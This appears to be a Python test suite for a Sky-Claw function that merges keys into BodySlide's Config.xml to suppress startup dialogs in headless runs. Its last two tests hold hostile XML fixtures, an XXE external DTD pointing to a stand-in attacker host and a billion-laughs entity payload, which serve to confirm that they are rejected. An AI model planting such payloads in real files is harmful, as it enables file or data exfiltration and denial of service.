"""Siembra del ``Config.xml`` de BodySlide — matar los modales de arranque.

**Por qué hace falta.** ``BodySlideApp::OnInit`` corre dos chequeos que abren un
``wxMessageBox`` MODAL antes de construir nada, y ninguno de los dos mira la
línea de comandos:

- línea 243: si ``GetOutputDataPath()`` no es legible/escribible. Lee
  ``Config["OutputDataPath"]`` o, vacío, ``Config["GameDataPath"]`` — **no** el
  ``-t`` que le pasamos. Con Skyrim en ``Program Files`` y el daemon sin elevar,
  este modal salta siempre.
- línea 2798: si no encuentra la clave de registro del juego y ``GameDataPath``
  está vacío.

Un modal en un proceso headless no se puede cerrar: ``run_capture`` espera a
``communicate()`` hasta el timeout y después mata el árbol. ``CREATE_NO_WINDOW``
no ayuda — suprime consolas, no ventanas GUI.

**La restricción que gobierna el diseño.** El ``Config.xml`` es del usuario:
trae listas negras de BSA, luces, teclas y demás. Sembrarlo NO puede ser
escribir un archivo nuevo encima — tiene que ser un merge que toque sólo las
claves que Sky-Claw necesita y preserve todo lo demás.
"""

from __future__ import annotations

import pathlib
import xml.etree.ElementTree as ET

from sky_claw.local.tools.bodyslide_config import sembrar_config_de_bodyslide

_CONFIG_DEL_USUARIO = """<Config>
    <TargetGame>-1</TargetGame>
    <WarnMissingGamePath>true</WarnMissingGamePath>
    <GameDataFiles>
        <SkyrimSpecialEdition>Skyrim - Meshes0.bsa</SkyrimSpecialEdition>
    </GameDataFiles>
    <GameDataPath></GameDataPath>
    <OutputDataPath></OutputDataPath>
    <ProjectPath>D:/MisProyectos</ProjectPath>
    <LogLevel>3</LogLevel>
    <Lights>
        <Ambient>20</Ambient>
    </Lights>
</Config>
"""


def _leer(config: pathlib.Path) -> ET.Element:
    return ET.parse(config).getroot()


def _texto(raiz: ET.Element, clave: str) -> str | None:
    nodo = raiz.find(clave)
    return None if nodo is None else (nodo.text or "")


def test_siembra_las_claves_que_evitan_los_modales(tmp_path: pathlib.Path) -> None:
    """Las tres claves que apagan los chequeos modales quedan seteadas."""
    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    salida = tmp_path / "game" / "BodySlide_Output"

    sembrar_config_de_bodyslide(exe_dir=exe_dir, game_path=tmp_path / "game", output_root=salida)

    raiz = _leer(exe_dir / "Config.xml")
    assert _texto(raiz, "GameDataPath") == str((tmp_path / "game" / "Data").resolve())
    assert _texto(raiz, "OutputDataPath") == str(salida.resolve())
    assert _texto(raiz, "WarnMissingGamePath") == "false"


def test_preserva_el_config_existente_del_usuario(tmp_path: pathlib.Path) -> None:
    """Merge, no sobrescritura: lo que no es nuestro sobrevive intacto.

    El ``Config.xml`` trae listas negras de BSA, luces y rutas de proyecto del
    usuario. Pisarlo con un archivo nuevo sería destruir configuración ajena para
    arreglar un modal.
    """
    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    (exe_dir / "Config.xml").write_text(_CONFIG_DEL_USUARIO, encoding="utf-8")

    sembrar_config_de_bodyslide(
        exe_dir=exe_dir,
        game_path=tmp_path / "game",
        output_root=tmp_path / "game" / "BodySlide_Output",
    )

    raiz = _leer(exe_dir / "Config.xml")
    # Lo ajeno sigue ahí.
    assert raiz.findtext("GameDataFiles/SkyrimSpecialEdition") == "Skyrim - Meshes0.bsa"
    assert raiz.findtext("Lights/Ambient") == "20"
    assert _texto(raiz, "LogLevel") == "3"
    # ProjectPath es del usuario y NO se toca: es la respuesta a "dónde están los
    # SliderSets", que se decide en la capa de VFS, no acá.
    assert _texto(raiz, "ProjectPath") == "D:/MisProyectos"
    # Y lo nuestro quedó aplicado.
    assert _texto(raiz, "WarnMissingGamePath") == "false"


def test_crea_el_config_si_no_existe(tmp_path: pathlib.Path) -> None:
    """Una instalación sin ``Config.xml`` es el peor caso: ``GameDataPath`` vacío
    manda a BodySlide a resolver por registro y, si falla, al modal de la 2798."""
    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)

    sembrar_config_de_bodyslide(
        exe_dir=exe_dir,
        game_path=tmp_path / "game",
        output_root=tmp_path / "game" / "BodySlide_Output",
    )

    assert (exe_dir / "Config.xml").is_file()
    assert _texto(_leer(exe_dir / "Config.xml"), "WarnMissingGamePath") == "false"


def test_es_idempotente(tmp_path: pathlib.Path) -> None:
    """Sembrar dos veces deja el mismo resultado — no duplica nodos.

    ``ConfigurationManager`` lee el PRIMER nodo con cada nombre; un duplicado
    dejaría un valor viejo ganando en silencio.
    """
    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    args = {
        "exe_dir": exe_dir,
        "game_path": tmp_path / "game",
        "output_root": tmp_path / "game" / "BodySlide_Output",
    }

    sembrar_config_de_bodyslide(**args)
    primera = (exe_dir / "Config.xml").read_text(encoding="utf-8")
    sembrar_config_de_bodyslide(**args)
    segunda = (exe_dir / "Config.xml").read_text(encoding="utf-8")

    assert primera == segunda
    assert len(_leer(exe_dir / "Config.xml").findall("GameDataPath")) == 1


async def test_run_batch_siembra_antes_de_spawnear(tmp_path: pathlib.Path) -> None:
    """La siembra tiene que ocurrir ANTES del spawn, no después.

    Sembrar después no sirve de nada: los dos chequeos modales corren en
    ``OnInit``, o sea que el proceso ya los evaluó cuando ``run_capture`` retorna.
    Se verifica el orden observando que el ``Config.xml`` ya esté sembrado en el
    instante en que se llama a ``run_capture``.
    """
    from unittest.mock import AsyncMock, patch

    from sky_claw.local.tools.bodyslide_runner import BodySlideConfig, BodySlideRunner

    exe = tmp_path / "tools" / "BodySlide" / "BodySlide.exe"
    exe.parent.mkdir(parents=True)
    runner = BodySlideRunner(BodySlideConfig(bodyslide_exe=exe, game_path=tmp_path / "game"))
    destino = tmp_path / "game" / "BodySlide_Output" / "CBBE"
    destino.mkdir(parents=True)
    (destino / "cuerpo.nif").write_bytes(b"\x00")

    sembrado_al_spawnear: dict[str, bool] = {}

    async def _fake(args, *, timeout, cwd=None):
        sembrado_al_spawnear["si"] = (exe.parent / "Config.xml").is_file()
        return (b"", b"", 0)

    with patch("sky_claw.local.tools.bodyslide_runner.run_capture", AsyncMock(side_effect=_fake)):
        await runner.run_batch("CBBE", str(destino))

    assert sembrado_al_spawnear["si"] is True
    raiz = _leer(exe.parent / "Config.xml")
    assert _texto(raiz, "WarnMissingGamePath") == "false"
    assert _texto(raiz, "OutputDataPath") == str((tmp_path / "game" / "BodySlide_Output").resolve())


def test_un_config_corrupto_no_aborta_la_corrida(tmp_path: pathlib.Path) -> None:
    """XML ilegible ⇒ se reporta ``False``, no se lanza.

    La siembra es una mejora de robustez, no una precondición del build: si el
    archivo del usuario está corrupto, el run debe poder seguir (y fallar, si
    falla, por su propia causa) en vez de morir acá con un ``ParseError``.
    """
    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    (exe_dir / "Config.xml").write_text("<Config><roto>", encoding="utf-8")

    resultado = sembrar_config_de_bodyslide(
        exe_dir=exe_dir,
        game_path=tmp_path / "game",
        output_root=tmp_path / "game" / "BodySlide_Output",
    )

    assert resultado is False
    # Y no se destruyó el archivo del usuario en el intento.
    assert (exe_dir / "Config.xml").read_text(encoding="utf-8") == "<Config><roto>"


def test_un_config_ilegible_no_aborta_la_corrida(tmp_path: pathlib.Path) -> None:
    """Un ``OSError`` al abrir tampoco puede tumbar el ritual (review CodeRabbit #433).

    ``run_batch`` llama a esta función ANTES de spawnear, así que un
    ``PermissionError`` sobre el ``Config.xml`` —archivo del usuario, permisos del
    usuario— impediría correr BodySlide en vez de degradar a "no sembré". El
    contrato documentado es best-effort; sólo lo es si también cubre el I/O.
    """
    from unittest.mock import patch

    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    (exe_dir / "Config.xml").write_text(_CONFIG_DEL_USUARIO, encoding="utf-8")

    with patch(
        "sky_claw.local.tools.bodyslide_config.DefusedElementTree.parse",
        side_effect=PermissionError("acceso denegado"),
    ):
        resultado = sembrar_config_de_bodyslide(
            exe_dir=exe_dir,
            game_path=tmp_path / "game",
            output_root=tmp_path / "game" / "BodySlide_Output",
        )

    assert resultado is False


def test_un_fallo_al_escribir_tampoco_aborta_la_corrida(tmp_path: pathlib.Path) -> None:
    """La otra mitad del best-effort: la ESCRITURA (review CodeRabbit #433).

    Los otros casos cubren la lectura/parseo. Si el ``write`` falla —disco lleno,
    archivo tomado por el AV, permisos— el contrato tiene que ser el mismo:
    ``False`` sin excepción, porque ``run_batch`` sigue llamando a esto antes del
    spawn. Una regresión acá volvería a impedir CORRER BodySlide.

    Y sobre todo: el ``Config.xml`` del usuario tiene que quedar **byte a byte**
    como estaba (review CodeRabbit #433). Escribir directo sobre el destino lo
    trunca si el ``write`` muere a mitad — destruir la config del usuario por un
    disco lleno es peor que no sembrar. La versión anterior de este test usaba un
    directorio VACÍO, así que pasaba sin ejercitar la preservación.
    """
    from unittest.mock import patch

    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    config = exe_dir / "Config.xml"
    config.write_text(_CONFIG_DEL_USUARIO, encoding="utf-8")
    original = config.read_bytes()

    # El fallo se simula A MITAD de escritura, no antes: un mock que sólo lanza
    # nunca toca el disco, así que la preservación sería trivialmente cierta y el
    # test pasaría con la implementación rota. Se escribe contenido parcial en la
    # ruta que reciba el ``write`` —el destino real si la escritura es directa, el
    # temporal si es atómica— y recién ahí se levanta el error.
    def _muere_a_mitad(destino: object, **_kwargs: object) -> None:
        pathlib.Path(str(destino)).write_bytes(b"<Config><GameDataPath>a-medio-escri")
        raise OSError("disco lleno")

    with patch("sky_claw.local.tools.bodyslide_config.ET.ElementTree.write", side_effect=_muere_a_mitad):
        resultado = sembrar_config_de_bodyslide(
            exe_dir=exe_dir,
            game_path=tmp_path / "game",
            output_root=tmp_path / "game" / "BodySlide_Output",
        )

    assert resultado is False
    assert config.read_bytes() == original, "un write fallido no puede dejar el Config.xml del usuario truncado"


def test_una_escritura_fallida_no_deja_temporales(tmp_path: pathlib.Path) -> None:
    """El temporal de la escritura atómica no queda huérfano en el directorio del exe.

    Es el directorio de instalación de BodySlide: acumular ``Config.xml.*.tmp``
    ahí es basura visible para el usuario, y encima confunde a cualquiera que
    mire la carpeta buscando por qué no toma la config.
    """
    from unittest.mock import patch

    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    (exe_dir / "Config.xml").write_text(_CONFIG_DEL_USUARIO, encoding="utf-8")

    def _muere_a_mitad(destino: object, **_kwargs: object) -> None:
        pathlib.Path(str(destino)).write_bytes(b"<Config>parcial")
        raise OSError("disco lleno")

    with patch("sky_claw.local.tools.bodyslide_config.ET.ElementTree.write", side_effect=_muere_a_mitad):
        sembrar_config_de_bodyslide(
            exe_dir=exe_dir,
            game_path=tmp_path / "game",
            output_root=tmp_path / "game" / "BodySlide_Output",
        )

    assert [p.name for p in exe_dir.iterdir()] == ["Config.xml"]


def test_rechaza_un_config_con_referencia_externa(tmp_path: pathlib.Path) -> None:
    """XXE por referencia externa ``SYSTEM``, la otra familia además de las entidades.

    ``forbid_external``/``forbid_dtd`` la cubren, pero sin test la protección
    depende de que nadie toque esos flags. Es la variante que exfiltra: apunta a
    un recurso de red o del filesystem local.
    """
    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    original = (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE Config SYSTEM "http://atacante.invalid/x.dtd">\n'
        "<Config><GameDataPath></GameDataPath></Config>"
    )
    (exe_dir / "Config.xml").write_text(original, encoding="utf-8")

    resultado = sembrar_config_de_bodyslide(
        exe_dir=exe_dir,
        game_path=tmp_path / "game",
        output_root=tmp_path / "game" / "BodySlide_Output",
    )

    assert resultado is False
    assert (exe_dir / "Config.xml").read_text(encoding="utf-8") == original, "no se toca el archivo del usuario"


def test_rechaza_un_config_con_entidades_xml(tmp_path: pathlib.Path) -> None:
    """Billion-laughs / XXE se rechazan sin sembrar (Bandit B314).

    El ``Config.xml`` vive junto al exe, en un directorio que Sky-Claw no controla
    del todo (lo puede haber puesto un instalador de mods). Se parsea con
    ``defusedxml``, igual que ``fomod.parser`` ya hace con ``ModuleConfig.xml``.
    """
    exe_dir = tmp_path / "tools" / "BodySlide"
    exe_dir.mkdir(parents=True)
    (exe_dir / "Config.xml").write_text(
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE Config [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;'>]>\n"
        "<Config><GameDataPath>&lol2;</GameDataPath></Config>",
        encoding="utf-8",
    )

    resultado = sembrar_config_de_bodyslide(
        exe_dir=exe_dir,
        game_path=tmp_path / "game",
        output_root=tmp_path / "game" / "BodySlide_Output",
    )

    assert resultado is False
    assert "&lol2;" in (exe_dir / "Config.xml").read_text(encoding="utf-8"), "no se toca el archivo del usuario"
